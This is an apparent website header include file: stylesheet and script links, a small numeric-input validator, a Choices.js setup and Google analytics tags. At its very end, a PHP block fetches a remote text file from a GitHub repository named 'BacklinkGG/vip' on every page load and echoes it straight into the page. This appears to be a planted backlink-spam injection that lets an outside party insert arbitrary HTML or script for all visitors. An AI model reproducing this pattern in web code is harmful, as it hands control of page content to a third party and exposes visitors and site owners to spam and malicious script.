<link rel="stylesheet" href="css/skf.css?v=45" type="text/css" />

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" type="text/javascript"></script>
 
  
  
<link href="css/hover-dropdown.css?v=5" rel="stylesheet" type="text/css" />


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">  
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>  

<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.4.1/css/mdb.min.css'>

<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">




<!-------------- Font Awesome ------------------>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" type="text/css" />

<link rel="stylesheet" href="https://cdn.linearicons.com/free/1.0.0/icon-font.min.css">
<!-------------- Font Awesome ------------------> 





 <!------------------ Owl Stylesheets ---------------->
 
    <link rel="stylesheet" href="owlcarousel/assets/owl.carousel.min.css">
    <link rel="stylesheet" href="owlcarousel/assets/owl.theme.default.min.css?v=1">
    <script src="owlcarousel/owl.carousel.js"></script>
    
    
  <!------------------ Owl Stylesheets ----------------> 
  


<style type="text/css">
li{
list-style:none;

}
</style>
<!--<style>
ul {
  list-style: none;
  padding: 0;
}
li {
  padding-left: 1.3em;
}
li:before {
  content: "\f178"; /* FontAwesome Unicode */
  font-family: FontAwesome;
  display: inline-block;
  margin-left: -1.3em; /* same as padding-left set on li */
  width: 1.3em; /* same as padding-left set on li */
}
</style>-->

<script>
function isNumberKey(evt) 
{
var charCode = (evt.which) ? evt.which : event.keyCode; 
if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)) 
{
return false;
} 
else 
{
return true;
} 
} 

</script>



<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/bbbootstrap/libraries@main/choices.min.css">
<!--<script src="https://cdn.jsdelivr.net/gh/bbbootstrap/libraries@main/choices.min.js"></script>-->
<script src="js/choices.min.js"></script>
   
<script type="text/javascript">

$(document).ready(function(){

var multipleCancelButton = new Choices('#choices-multiple-remove-button', {
removeItemButton: true,
maxItemCount:100,
searchResultLimit:100,
renderChoiceLimit:100
});


});

</script>






<?php //include'header-button.php'?>

    <script>

$(document).ready(function(){

  $(".Request-button").click(function(){

    $(".form1").toggleClass("form2");

  });

});

</script>  



<!-- Global site tag (gtag.js) - Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-9C6DQE59M1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-9C6DQE59M1'); </script>



<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-W344WL3');</script>
<!-- End Google Tag Manager -->



<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>
